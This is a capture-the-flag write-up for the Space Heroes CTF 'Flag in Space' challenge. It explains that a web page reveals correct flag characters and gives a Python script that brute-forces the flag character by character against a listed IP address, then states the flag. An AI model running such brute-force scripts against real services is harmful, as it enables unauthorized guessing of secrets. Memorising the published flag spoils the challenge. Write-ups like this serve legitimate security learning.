# Flag in Space
**Author**: S|{oto

**CTF**:  Space Heroes CTF

**Description**: 

*“The exploration of space will go ahead, whether we join in it or not.”*

*- John F. Kennedy*

*http://172.105.154.14/?flag=*

*Author: v10l3nt*

**Hints**: n/a

Looking at the challenge website, we see that there are 25 empty squares.

To solve the challenge, we begin by examining the URL.  Clearly, the `flag=` field is looking for us to input a flag.  By tinkering with the URL, we can see that changing the URL to `flag=shctf{}` fills the first six boxes on the website with the characters `s` `h` `c` `t` `f` `{`.  Since the closing bracket is not placed into a seventh box, apparently boxes are only filled in with correct characters from the flag.

Since we now know that only putting correct characters into the URL will change the website, we can write a simple python script to brute-force the flag.

```python
import webbrowser
import urllib.request

url = "http://172.105.154.14/?flag="

# Get the HTML of the website before any flag is input
html1 = urllib.request.urlopen(url).read().decode("utf8")

# Check all possible characters to fill each of the 25 boxes
for box in range(25):
    # Test all the valid standard characters for a URL, as well as { and }
    for char in list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~:/?#[]@!$&'()*+,;={}"):
        # Get the HTML of the website after appending different chars to the URL
        html2 = urllib.request.urlopen(url + char).read().decode("utf8")

        # If appending a char changed the HTML, then that char must have led
        # to one of the boxes being filled, and is therefore correct
        if (html1 != html2):
            # update URL and associated HTML
            url = url + char
            html1 = html2
            break  # correct character for this box has been found, move to next box

# correct flag has been assembled, open the browser as a final check
webbrowser.open(url)
```

Once the script has finished running, we can simply look at the URL to find that the flag is `shctf{2_explor3_fronti3r}`.
